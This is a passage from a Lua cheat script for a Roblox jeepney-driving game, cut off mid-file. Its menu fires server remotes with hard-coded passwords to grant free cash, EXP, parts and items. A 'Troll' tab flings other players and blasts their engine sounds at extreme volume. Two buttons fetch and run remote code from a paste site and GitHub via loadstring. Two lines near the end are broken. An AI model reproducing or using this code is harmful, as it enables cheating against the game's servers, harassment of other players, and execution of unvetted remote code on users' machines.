        if state then
            task.spawn(function()
                while getgenv().AutoDeductCash do
                    pcall(function()
                        local args = {{{"3","DeductCash",{Value = 1000, Password = 649686508}}}}
                        _CatNet:FireServer(unpack(args))
                    end)
                    task.wait(0.001)
                end
            end)
        end
    end
})

getgenv().AutoDeductExp = false
tabExp:AddToggle("tg10", {
    Title = "Auto Deduct EXP",
    Default = false,
    Callback = function(state)
        getgenv().AutoDeductExp = state
        if state then
            task.spawn(function()
                while getgenv().AutoDeductExp do
                    pcall(function()
                        local args = {{{"3","DeductExp",{Value = 1000, Password = 62199980}}}}
                        _CatNet:FireServer(unpack(args))
                    end)
                    task.wait(0.001)
                end
            end)
        end
    end
})

tabExp:AddToggle("tg11", {
    Title = "Auto Deduct Coin",
    Default = false,
    Callback = function(state)
        getgenv().AutoDeductCoin = state
        if state then
            task.spawn(function()
                while getgenv().AutoDeductCoin do
                    pcall(function()
                        local jeepnies = workspace:FindFirstChild("Jeepnies")
                        if not jeepnies then return end
                        local myJeep = jeepnies:FindFirstChild(LocalPlayer.Name)
                        if not myJeep then return end
                        local passengerValues = myJeep:FindFirstChild("PassengerValues")
                        if not passengerValues then return end
                        local args = {[1] = {[1] = {[1]="3",[2]="DeductCoin",[3]={["PassengerValues"]=passengerValues,["Password"]=212417354,["Value"]=1000}}}}
                        _CatNet:FireServer(unpack(args))
                    end)
                    task.wait(0.001)
                end
            end)
        end
    end
})

-- ============================================================
-- TELEPORT PAGE
-- ============================================================


-- Auto EXP & Massive Passenger
getgenv().DNS_AutoExpMassive = false
tabExp:AddToggle("tgAutoExpMassive", {
    Title   = "Auto EXP & Massive Passenger",
    Default = false,
    Callback = function(state)
        getgenv().DNS_AutoExpMassive = state
        if state then
            task.spawn(function()
                local _net = game:GetService("ReplicatedStorage")
                    :WaitForChild("CatNet",9e9):WaitForChild("Cat",9e9)
                while getgenv().DNS_AutoExpMassive do
                    pcall(function()
                        local _a={[1]={[1]={[1]="3";[2]="Bark";[3]={
                            ["Password"]=622233069;
                            ["Route"]="Balagtas - Bulakan";
                            ["VoiceOver"]="BALAGTAS";
                            ["GiveExp"]=true;
                            ["MunicipalityOrCity"]="ToBalagtasTerminalLoadPoint";
                        }}}}
                        _net:FireServer(unpack(_a))
                    end)
                    task.wait()
                end
            end)
        end
    end
})


local tabTp = Window:AddTab({ Title = "Teleport", Icon = "solar/planet-bold" })

local function tpJeepOrPlayer(target)
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not target then
        return
    end
    local targetPos = (target:IsA("BasePart") and target.Position) or target.Position
    local newPos = targetPos + Vector3.new(0, 5, 0)
    if hum and hum.Sit and hum.SeatPart and hum.SeatPart:IsA("VehicleSeat") then
        local jeep = hum.SeatPart:FindFirstAncestorOfClass("Model")
        if jeep and jeep.PrimaryPart then
            for _, v in ipairs(jeep:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Anchored = true
                end
            end
            jeep:SetPrimaryPartCFrame(CFrame.new(newPos))
            task.wait(0.15)
            for _, v in ipairs(jeep:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Anchored = false
                end
            end
            return
        end
    end
    hrp.CFrame = CFrame.new(newPos)
end

tabTp:AddSection("Malolos - Bulakan")
tabTp:AddButton({ Title = "To Malolos Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Malolos - Bulakan"].ToMalolosTerminalLoadPoint) end })
tabTp:AddButton({ Title = "To Bulakan Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Malolos - Bulakan"].ToBulakanTerminalLoadPoint) end })
tabTp:AddButton({ Title = "Malolos Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Malolos - Bulakan"].MalolosTerminalDropPoint) end })
tabTp:AddButton({ Title = "Bulakan Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Malolos - Bulakan"].BulakanTerminalDropPoint) end })

tabTp:AddDivider()
tabTp:AddSection("Guiguinto - Bulakan")
tabTp:AddButton({ Title = "To Guiguinto Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Guiguinto - Bulakan"].ToGuiguintoTerminalLoadPoint) end })
tabTp:AddButton({ Title = "To Bulakan Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Guiguinto - Bulakan"].ToBulakanTerminalLoadPoint) end })
tabTp:AddButton({ Title = "Guiguinto Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Guiguinto - Bulakan"].GuiguintoTerminalDropPoint) end })
tabTp:AddButton({ Title = "Bulakan Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Guiguinto - Bulakan"].BulakanTerminalDropPoint) end })

tabTp:AddDivider()
tabTp:AddSection("Balagtas - Bulakan")
tabTp:AddButton({ Title = "To Balagtas Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Balagtas - Bulakan"].ToBalagtasTerminalLoadPoint) end })
tabTp:AddButton({ Title = "To Bulakan Terminal", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.TerminalParts["Balagtas - Bulakan"].ToBulakanTerminalLoadPoint) end })
tabTp:AddButton({ Title = "Balagtas Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Balagtas - Bulakan"].BalagtasTerminalDropPoint) end })
tabTp:AddButton({ Title = "Bulakan Drop Point", Callback = function() tpJeepOrPlayer(workspace.Map.Misc.PassengerSpawnPoints["Balagtas - Bulakan"].BulakanTerminalDropPoint) end })

-- ============================================================
-- TROLL PAGE
-- ============================================================

local tabTroll = Window:AddTab({ Title = "Troll", Icon = "solar/danger-triangle-bold" })

local flingEnabled = false
local flingAll = false
local flingTarget = ""
local flingOrigPos = nil
local bV
local bAV

local function getPlayerNames()
    local names = {}
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(names, p.Name)
        end
    end
    return names
end

local function GetFlingTarget()
    if flingAll then
        local plys = {}
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(plys, p)
            end
        end
        if #plys > 0 then
            return plys[math.random(1, #plys)]
        end
    else
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.Name == flingTarget then
                return p
            end
        end
    end
    return nil
end

task.spawn(function()
    while true do
        if flingEnabled or flingAll then
            local target = GetFlingTarget()
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and hrp then
                if not bV or not bV.Parent then
                    bV = Instance.new("BodyVelocity", hrp)
                    bV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bV.Velocity = Vector3.new(900000, 900000, 900000)
                end
                if not bAV or not bAV.Parent then
                    bAV = Instance.new("BodyAngularVelocity", hrp)
                    bAV.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    bAV.AngularVelocity = Vector3.new(0, 999999, 0)
                end
                hrp.CFrame = target.Character.HumanoidRootPart.CFrame
            else
                if not flingAll and bV then
                    bV:Destroy() bV = nil
                end
                if not flingAll and bAV then
                    bAV:Destroy() bAV = nil
                end
            end
        else
            if bV then
                bV:Destroy() bV = nil
            end
            if bAV then
                bAV:Destroy() bAV = nil
            end
        end
        task.wait()
    end
end)

tabTroll:AddSection("Fling Controls")

tabTroll:AddDropdown("dd15", {
    Title = "Select Target",
    List = getPlayerNames(),
    Value = "",
    Callback = function(v) flingTarget = v end
})

tabTroll:AddButton({
    Title = "Refresh Players",
    Callback = function()
        Library:Notification({
            Title = "BELLE SG",
            Color = "#8B5CF6",
            Duration = 3
        })
    end
})

tabTroll:AddToggle("tg12", {
    Title = "Enable Flinger",
    Default = false,
    Callback = function(v)
        flingEnabled = v
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if v then
            if hrp then
                flingOrigPos = hrp.CFrame
            end
        else
            if hrp then
                hrp.RotVelocity = Vector3.new(0,0,0)
                hrp.Velocity = Vector3.new(0,0,0)
                if flingOrigPos then
                    hrp.CFrame = flingOrigPos
                    flingOrigPos = nil
                end
            end
        end
    end
})

tabTroll:AddToggle("tg13", {
    Title = "Fling All",
    Default = false,
    Callback = function(v)
        flingAll = v
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if v then
            if hrp then
                flingOrigPos = hrp.CFrame
            end
        else
            if hrp then
                hrp.RotVelocity = Vector3.new(0,0,0)
                hrp.Velocity = Vector3.new(0,0,0)
                if flingOrigPos then
                    hrp.CFrame = flingOrigPos
                    flingOrigPos = nil
                end
            end
        end
    end
})

tabTroll:AddDivider()
tabTroll:AddSection("Audio Troll")

local LoudEngineEnabled = false

tabTroll:AddToggle("tg14", {
    Title = "Engine Troll",
    Default = false,
    Callback = function(state)
        LoudEngineEnabled = state
        if LoudEngineEnabled then
            task.spawn(function()
                while LoudEngineEnabled do
                    local jeepFolder = workspace:FindFirstChild("Jeepnies")
                    if jeepFolder then
                        for _, jeep in ipairs(jeepFolder:GetChildren()) do
                            local soundRE = jeep:FindFirstChild("SoundRE")
                            if soundRE then
                                local sounds = {"EngineRev", "EngineIdle"}
                                for _, sName in ipairs(sounds) do
                                    local args = {
                                        [1] = "UpdateSound",
                                        [2] = { ["Pitch"] = 2, ["SoundName"] = sName, ["Volume"] = 8888888888888888888 }
                                    }
                                    pcall(function() soundRE:FireServer(unpack(args)) end)
                                end
                            end
                        end
                    end
                    task.wait(0.001)
                end
            end)
        end
    end
})

-- ============================================================
-- SHOP PAGE
-- ============================================================

local tabShop = Window:AddTab({ Title = "Shop", Icon = "solar/tag-bold" })

local selectedJeepForParts = "Milwaukee Motor Sport 11 Seater_#1"
local selectedPart = ""

tabShop:AddSection("Unlock All Parts")

tabShop:AddButton({
    Title = "Buy Single Part",
    Callback = function()
        local args = {[1]={[1]={[1]="3",[2]="CloseCustomize",[3]={["Password"]=341958586,["NewOwnedParts"]={[selectedPart]=100},["JeepneyName"]=selectedJeepForParts}}}}
        ReplicatedStorage:WaitForChild("CatNet"):FireServer(unpack(args))
    end
})

tabShop:AddButton({
    Title = "Unlock All Parts (100%)",
    Callback = function()
        local args = {[1]={[1]={[1]="3",[2]="CloseCustomize",[3]={["Password"]=341958586,["NewOwnedParts"]={
            ["BA - 05"]=100,["BA - 01"]=100,["BA - 03"]=100,["T - 02 (R)"]=100,
            ["6-Speed Manual"]=100,["5-Speed Manual"]=100,["C - 04"]=100,["TO - 01"]=100,
            ["4HK1 Twin Turbo"]=100,["4JJ1"]=100,["BF - 02"]=100,["4BC2"]=100,
            ["4HE1 Single Turbo"]=100,["4-Speed Manual (High Ratio)"]=100,["R - 02"]=100,["EO - 01"]=100,
            ["T - 05 (R)"]=100,["T - 03 (R)"]=100,["TO - 02"]=100,["T - 04 (F)"]=100,
            ["EO - 03"]=100,["B - 04"]=100,["T - 05 (F)"]=100,["CL - 02"]=100,
            ["4JK1"]=100,["BA - 02"]=100,["EO - 04"]=100,["T - 04 (R)"]=100,
            ["C - 02"]=100,["BA - 04"]=100,["T - 02 (F)"]=100,["EO - 02"]=100,
            ["B - 05"]=100,["TO - 05"]=100,["CL - 01"]=100,["C - 03"]=100,
            ["B - 03"]=100,["BF - 01"]=100,["4HF1 Twin Turbo"]=100,["T - 01 (F)"]=100,
            ["TO - 03"]=100,["TO - 04"]=100,["B - 02"]=100,["R - 01"]=100,
            ["T - 01 (R)"]=100,["4-Speed Manual"]=100,["EO - 05"]=100,["4BE1"]=100,
            ["T - 03 (F)"]=100,["B - 01"]=100,["4HK1 Single Turbo"]=100,["D - 01"]=100,["C - 01"]=100,
        },["JeepneyName"]=selectedJeepForParts}}}}
        ReplicatedStorage:WaitForChild("CatNet"):FireServer(unpack(args))
    end
})

tabShop:AddDivider()
tabShop:AddSection("Buy Jeepneys")

local jeepNames = {
    "Milwaukee Motor Sport 11 Seater",
    "Morales 10 Seater",
    "DF Devera Long Model",
    "Sarao Custombuilt Model 2",
    "Xlt Auv 12 Seater",
}
local selectedJeep = jeepNames[1]

tabShop:AddDropdown("dd16", {
    Title = "Select Jeepney",
    List = jeepNames,
    Value = jeepNames[1],
    Callback = function(v) selectedJeep = v end
})

tabShop:AddButton({
    Title = "Buy Jeepney",
    Callback = function()
        pcall(function()
            local args = {{{"3","BuyJeepney",{JeepneyName=selectedJeep,Password=774827611}}}}
            ReplicatedStorage:WaitForChild("CatNet"):WaitForChild("Cat"):FireServer(unpack(args))
        end)
    end
})

tabShop:AddDivider()
tabShop:AddSection("Shop Items")

local shopItems = {
    {Name="Bloxy Cola",Password=312590325},{Name="Hotdog",Password=312590325},
    {Name="Burger",Password=312590325},{Name="Betamax",Password=699268542},
    {Name="Calamares",Password=699268542},{Name="Isaw",Password=699268542},
    {Name="Water",Password=699268542},{Name="Quek Quek",Password=699268542}
}
for _, item in pairs(shopItems) do
    tabShop:AddButton({
        Title = item.Name,
        Callback = function()
            local args = {[1]={["Password"]=item.Password;["FoodName"]=item.Name;}}
            pcall(function() ReplicatedStorage:WaitForChild("Remotes",9e9):WaitForChild("BuyFood",9e9):InvokeServer(unpack(args)) end)
        end
    })
end

tabShop:AddDivider()
tabShop:AddSection("Item Tools")

local toolItems = {
    {Name="Rope",Password=626326648},{Name="Wrench",Password=626326648},
    {Name="Baseball bat",Password=626326648},{Name="Metal pipe",Password=626326648},
    {Name="Hammer",Password=626326648},{Name="Diesel can",Password=626326648}
}
for _, tool in pairs(toolItems) do
    tabShop:AddButton({
        Title = tool.Name,
        Callback = function()
            local args = {[1]={["Password"]=tool.Password;["ToolName"]=tool.Name;}}
            pcall(function() ReplicatedStorage:WaitForChild("Remotes",9e9):WaitForChild("BuyTool",9e9):InvokeServer(unpack(args)) end)
        end
    })
end

-- ============================================================
-- OTHER PAGE
-- ============================================================

local tabOther = Window:AddTab({ Title = "Other", Icon = "solar/settings-bold" })

tabOther:AddSection("Jeep Controls")

tabOther:AddButton({
    Title = "Register Jeepney",
    Callback = function()
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("RegisterJeepney"):FireServer()
        end)
    end
})

tabOther:AddDivider()
tabOther:AddSection("Misc")

tabOther:AddButton({
    Title = "Driver License",
    Callback = function()
        local args = {{{"3","PassedTheExam",{Password=318862364}}}}
        game:GetService("ReplicatedStorage"):WaitForChild("CatNet"):WaitForChild("Cat"):FireServer(unpack(args))
    end
})

tabOther:AddButton({
    Title = "Free Cam",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/xfVluu2u/raw"))()
    end
})

tabOther:AddButton({
    Title = "ESP Jeep",
    Callback = function()
        local function createESP(car)
            if not car:FindFirstChild("JeepESP") then
                local highlight = Instance.new("Highlight")
                highlight.Name = "JeepESP"
                highlight.Adornee = car
                highlight.FillColor = Color3.fromRGB(139, 92, 246)
                highlight.FillTransparency = 0.5
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                highlight.OutlineTransparency = 0.2
                highlight.Parent = car

                local billboard = Instance.new("BillboardGui")
                billboard.Name = "JeepName"
                billboard.Adornee = car.PrimaryPart or car:FindFirstChildOfClass("BasePart")
                billboard.Size = UDim2.new(0, 200, 0, 50)
                billboard.StudsOffset = Vector3.new(0, 4, 0)
                billboard.AlwaysOnTop = true

                local label = Instance.new("TextLabel")
                label.Parent = billboard
                label.BackgroundTransparency = 1
                label.Size = UDim2.new(1, 0, 1, 0)
                label.TextColor3 = Color3.fromRGB(196, 181, 253)
                label.TextStrokeTransparency = 0
                label.TextScaled = true
                label.Font = Enum.Font.SourceSansBold
                billboard.Parent = car

                task.spawn(function()
                    while car and car.Parent do
                        local driverName = "No Driver"
                        local driveSeat = car:FindFirstChildOfClass("VehicleSeat") or car:FindFirstChild("DriveSeat")
                        if driveSeat and driveSeat.Occupant then
                            driverName = driveSeat.Occupant.Parent.Name
                        end
                        local distance = 0
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            distance = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - billboard.Adornee.Position).Magnitude)
                        end
                        label.Text = string.format("Jeep | %s | %d studs", driverName, distance)
                        task.wait(0.5)
                    end
                end)
            end
        end

        local jeeps = workspace:FindFirstChild("Jeepnies")
        if jeeps then
            for _, v in pairs(jeeps:GetChildren()) do
                createESP(v)
            end
        end
    end
})

tabOther:AddButton({
    Title = "DELETE NPC CAR",
    Callback = function()
        pcall(function()
            local folder = workspace:FindFirstChild("AiVehicles")
            if folder then
                folder:ClearAllChildren()
            else
                for _, v in pairs(workspace:GetChildren()) do
                    if v:IsA("Model") and (v.Name:find("NPC") or v.Name:find("AI")) then
                        local seat = v:FindFirstChildOfClass("VehicleSeat") or v:FindFirstChild("DriveSeat")
                        if seat and not seat.Occupant then
                            v:Destroy()
                        end
                    end
                end
            end
        end)
    end
})

tabOther:AddButton({
    Title = "AUTO COMPLETE TUTORIAL",
    Callback = function()
        pcall(function()
            local args = {{{"3","CompletedTutorial",{Password=176096284}}}}
            game:GetService("ReplicatedStorage"):WaitForChild("CatNet"):WaitForChild("Cat"):FireServer(unpack(args))
        end)
    end
})

tabOther:AddDivider()
tabOther:AddSection("Auto Farm KM")

local isKmActive = false

tabOther:AddToggle("tg17", {
    Title = "Enable Auto KM",
    Default = false,
    Callback = function(v)
        isKmActive = v
        if isKmActive then
            task.spawn(function()
                local flightHeight = 500
                local speed = 550
                while isKmActive do
                    local char = LocalPlayer.Character
                    local hum = char and char:FindFirstChild("Humanoid")
                    if hum and hum.SeatPart then
                        local car = hum.SeatPart.Parent
                        if car:FindFirstChild("Body") and car.Body:FindFirstChild("#Weight") then
                            car.PrimaryPart = car.Body["#Weight"]
                        end
                        local carPrimaryPart = car.PrimaryPart or (car:FindFirstChild("Body") and car.Body:FindFirstChild("#Weight"))
                        if carPrimaryPart then
                            local location1 = Vector3.new(-6205.2983, flightHeight, 8219.8535)
                            local location2 = Vector3.new(-7594.5410, flightHeight, 5130.9526)
                            repeat
                                task.wait()
                                if not (hum.SeatPart) or not isKmActive then
                                    break
                                end
                                carPrimaryPart.AssemblyLinearVelocity = (location1 - carPrimaryPart.Position).Unit * speed
                                car:PivotTo(CFrame.lookAt(carPrimaryPart.Position, location1))
                            until (carPrimaryPart.Position - location1).Magnitude < 50
                            carPrimaryPart.AssemblyLinearVelocity = Vector3.zero
                            repeat
                                task.wait()
                                if not (hum.SeatPart) or not isKmActive then
                                    break
                                end
                                carPrimaryPart.AssemblyLinearVelocity = (location2 - carPrimaryPart.Position).Unit * speed
                                car:PivotTo(CFrame.lookAt(carPrimaryPart.Position, location2))
                            until (carPrimaryPart.Position - location2).Magnitude < 50
                            carPrimaryPart.AssemblyLinearVelocity = Vector3.zero
                        end
                    end
                    task.wait(1)
                end
            end)
        end
    end
})

tabOther:AddDivider()
tabOther:AddSection("Game Settings")

tabOther:AddToggle("tg18", {
    Title = "FPS Boost",
    Default = false,
    Callback = function(Value)
        if Value then
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
                    v.Material = Enum.Material.SmoothPlastic
                    v.Reflectance = 0
                elseif v:IsA("Decal") or v:IsA("Texture") then
                    v.Transparency = 1
                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                    v.Enabled = false
                end
            end
            settings().Rendering.QualityLevel = 1
            game.Lighting.GlobalShadows = false
        end
    end
})

tabOther:AddButton({
    Title = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
})

-- ============================================================
-- MUSIC PAGE
-- ============================================================

local tabMusic = Window:AddTab({ Title = "Music", Icon = "solar/volume-loud-bold" })

local camera = workspace.CurrentCamera
local musicSound = Instance.new("Sound")
musicSound.Parent = camera
musicSound.Volume = 1
musicSound.Looped = false

local songs = {
    {Id=102530888109784,Name="No limit Ice ice"},{Id=86793099693274,Name="PUFF ME UP SUPAFLY"},
    {Id=104642889770966,Name="Thug Love"},{Id=123193066922226,Name="MYDAY HELLMERRY"},
    {Id=96349817794138,Name="XXXX"},{Id=105433463687285,Name="Alam mo ba girl Hev Abi"},
    {Id=78338689906576,Name="Marikit Sa Dilim"},{Id=80186643942739,Name="Kung Ako Sayo"},
    {Id=116809617492226,Name="6lock"},{Id=105849669299967,Name="Walang Pag-Ibig"},
    {Id=72274745745781,Name="Pagsamo"},{Id=82410487906541,Name="Bakit Nga Ba Mahal Kita"},
    {Id=1188403994693034,Name="Masaya Ka Sa Iba"},{Id=79311041168107,Name="Oksihina"},
    {Id=118668717534464,Name="Multo"},{Id=119536408246566,Name="Eroplanong Papel"},
    {Id=104973165878865,Name="Bulong"},{Id=104293367124017,Name="Kundiman"},
    {Id=81413378667534,Name="Kung Wala Ka"},{Id=116237878392921,Name="Bumalik Kana Sakin"},
    {Id=99019663546064,Name="Rebound"},{Id=120403965756395,Name="Nasa Puso Ka Parin"},
    {Id=86777554622462,Name="Magkaiba"},{Id=106174792478284,Name="Love attack"},
    {Id=75822084529419,Name="Alipin"},{Id=129046939580756,Name="The Woman Who Can't Be Moved"},
    {Id=100747716273742,Name="Mahika - TJ Monterde Live"},{Id=124820719478947,Name="Tingin - Cup of Joe Live"},
    {Id=90591472148973,Name="Heaven Knows - Rock Version"},{Id=113762943787847,Name="Hey Crush - Joshua Garcia"},
    {Id=94475074502605,Name="Alam Mo Ba Girl - Hev Abi"},{Id=78426236518475,Name="Para Sa Streets - Hev Abi"},
    {Id=86700413156316,Name="Randomantic - TJ Monterde"},{Id=108873659010908,Name="Babaero - Hev Abi Soul AI"},
    {Id=139463481930838,Name="Papap Dol Budots Remix"},{Id=88690983161170,Name="Baduy! - Vvink"},
    {Id=71879611226471,Name="Hanggang Sa Huli - Alisson Shore"},{Id=109046857444579,Name="Urong Sulong - Alisson Shore"},
    {Id=96259697252611,Name="Byahe - Jroa"},{Id=88881552063453,Name="Arizona B Budots"},
    {Id=93542593797773,Name="Co-Pilot - Jush Hugh"},{Id=78487275982635,Name="Salamin Salamin by Eric"},
    {Id=115816944184683,Name="Malay Ko Daniel Padilla"},{Id=139751146414163,Name="Buhay ng Gangsta"},
    {Id=111330689779749,Name="Rock that body Budots"},{Id=116909196354204,Name="Opalite x Golden Budots"},
    {Id=112590536755182,Name="Sabi Ko Na Barbie Budots"},{Id=86273886532794,Name="Iris by Goo Goo Dolls Rock"},
    {Id=105897803731104,Name="Wala Na Pag Ibig by Drei"},{Id=108769896869101,Name="INTROHAN NATIN by Hev Abi"},
    {Id=131178324358019,Name="Alam Ko Na by DENY"},{Id=114182593972695,Name="Kabute"},
    {Id=93272267476694,Name="Baliw by SUD"},{Id=91241303056228,Name="Namumula by Maki"},
    {Id=116695707585893,Name="Kailan? by Maki"},{Id=80660014894209,Name="All or Nothing by Michael P."},
    {Id=113463168801116,Name="Kung Sakali by Michael P."},{Id=104348021759246,Name="Two Times Budots"},
    {Id=71275570481350,Name="Migrain by Moonstar88"},{Id=78446156193949,Name="Fixing a Broken Heart"},
    {Id=126606110469298,Name="Officially Missing You"},{Id=133257180884988,Name="Torete"},
    {Id=92211397826543,Name="Panis Ka Boy Remix"},{Id=79902104729560,Name="Maligayang Pasko"},
    {Id=83553933296460,Name="Magkakasama sa Pasko 2013"},{Id=120200330391730,Name="Thank you for the love 2015"},
    {Id=122893796050555,Name="Ngayong Pasko 2010"},
}

local function playSong(id)
    if musicSound.IsPlaying then
        musicSound:Stop()
    end
    musicSound.SoundId = "rbxassetid://" .. tostring(id)
    musicSound:Play()
end

tabMusic:AddSection("Controls")

tabMusic:AddButton({
    Title = "Stop Music",
    Callback = function()
        if musicSound.IsPlaying then
            musicSound:Stop()
        end
    end
})

tabMusic:AddDivider()
tabMusic:AddSection("Playlist")

for _, s in ipairs(songs) do
    tabMusic:AddButton({
        Title = s.Name,
        Callback = function() playSong(s.Id) end
    })
end

-- ============================================================
-- SERVER PAGE
-- ============================================================

local tabServer = Window:AddTab({ Title = "Server", Icon = "solar/layers-bold" })

tabServer:AddSection("Management")

tabServer:AddButton({
    Title = "Rejoin Server",
    Callback = function()
        local ts = game:GetService("TeleportService")
        ts:Teleport(game.PlaceId, LocalPlayer)
    end
})

tabServer:AddButton({
    Title = "Swap Server (Hop)",
    Callback = function()
        local Http = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        local Api = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
        local function ListServers(cursor)
            local Raw = game:HttpGet(Api .. ((cursor and "&cursor=" .. cursor) or ""))
            return Http:JSONDecode(Raw)
        end
        local Next
        repeat
            local Servers = ListServers(Next)
            for i, v in next, Servers.data do
                if v.playing < v.maxPlayers and v.id ~= game.JobId then
                    TPS:TeleportToPlaceInstance(game.PlaceId, v.id)
                    break
                end
            end
            Next = Servers.nextPageCursor
        until not Next
    end
})

tabServer:AddButton({
    Title = "Small Server",
    Callback = function()
        local Http = game:GetService("HttpService")
        local TPS = game:GetService("TeleportService")
        local Api = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        local function ListServers(cursor)
            local Raw = game:HttpGet(Api .. ((cursor and "&cursor=" .. cursor) or ""))
            return Http:JSONDecode(Raw)
        end
        local Next
        repeat
            local Servers = ListServers(Next)
            for i, v in next, Servers.data do
                if v.playing < v.maxPlayers and v.id ~= game.JobId then
                    TPS:TeleportToPlaceInstance(game.PlaceId, v.id)
                    break
                end
            end
            Next = Servers.nextPageCursor
        until not Next
    end
})

local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local WHITE_GRADIENT = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(168, 85, 247)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 92, 246))
})

local LOGO_ASSET_REF = LOGO_ASSET  -- same as rbxassetid://74730846535909
local THIN_BORDER = 1.0

local function ApplyXenonGradient(v)
    if v:IsA("UIStroke") then
        v.Enabled = true
        v.Color = Color3.fromRGB(139, 92, 246)
        local grad = v:FindFirstChild("BELLEGrad") or Instance.new("UIGradient")
        grad.Name = "BELLEGrad"
        grad.Color = WHITE_GRADIENT
        grad.Rotation = 90
        grad.Parent = v
        if v.Parent and (v.Parent:IsA("TextLabel") or v.Parent:IsA("TextButton") or v.Parent:IsA("TextBox")) then
            v.Thickness = 0.8
            v.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
        else
            v.Thickness = THIN_BORDER
            v.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        end
        if v.Parent and v.Parent:IsA("GuiObject") then
            v.Parent.BorderSizePixel = 0
        end
    end
end

for _, v in pairs(PlayerGui:GetDescendants()) do
    ApplyXenonGradient(v)
end
PlayerGui.DescendantAdded:Connect(function(v) ApplyXenonGradient(v) end)

local function SendLog()
    local target = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Screen"):WaitForChild("Labels"):WaitForChild("HungerLabels")
    for _, child in pairs(target:GetChildren()) do
        if child:IsA("GuiObject") or child:IsA("UIComponent") then
            child:Destroy()
        end
    end
    target.BackgroundTransparency = 1

    local f = Instance.new("Frame")
    f.Name = "BELL.SG"
    f.Parent = target
    f.Size = UDim2.new(0, 160, 0, 34)
    f.Position = UDim2.new(0, -2, 0, -5)
    f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    f.BackgroundTransparency = 0.1
    f.BorderSizePixel = 0

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = f

    local s = Instance.new("UIStroke")
    s.Thickness = 2
    s.Color = Color3.fromRGB(139, 92, 246)
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = f

    local icon = Instance.new("ImageLabel")
    icon.Parent = f
    icon.Size = UDim2.new(0, 45, 0, 18)
    icon.Position = UDim2.new(0, 10, 0.5, -9)
    icon.BackgroundTransparency = 1
    icon.Image = LOGO_ASSET
    icon.ScaleType = Enum.ScaleType.Fit

    local title = Instance.new("TextLabel")
    title.Parent = f
    title.Size = UDim2.new(1, -65, 0, 16)
    title.Position = UDim2.new(0, 60, 0, 1)
    title.
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 12
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1

    local sub = Instance.new("TextLabel")
    sub.Parent = f
    sub.Size = UDim2.new(1, -65, 0, 16)
    sub.Position = UDim2.new(0, 60, 0, 15)
    sub.
    sub.TextColor3 = Color3.fromRGB(255, 255, 255)
    sub.Font = Enum.Font.GothamBold
    sub.TextSize = 12
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.BackgroundTransparency = 1
end

pcall(SendLog)

local buttonSound = game:GetService("ReplicatedStorage"):WaitForChild("Sounds"):WaitForChild("ButtonClick")
buttonSound:Stop()
buttonSound.SoundId = "rbxassetid://876939830"
buttonSound.Volume = 10
buttonSound.PlaybackSpeed = 1
buttonSound:Play()
buttonSound:GetPropertyChangedSignal("SoundId"):Connect(function()
    if buttonSound.SoundId ~= "rbxassetid://876939830" then
        buttonSound.SoundId = "rbxassetid://876939830"
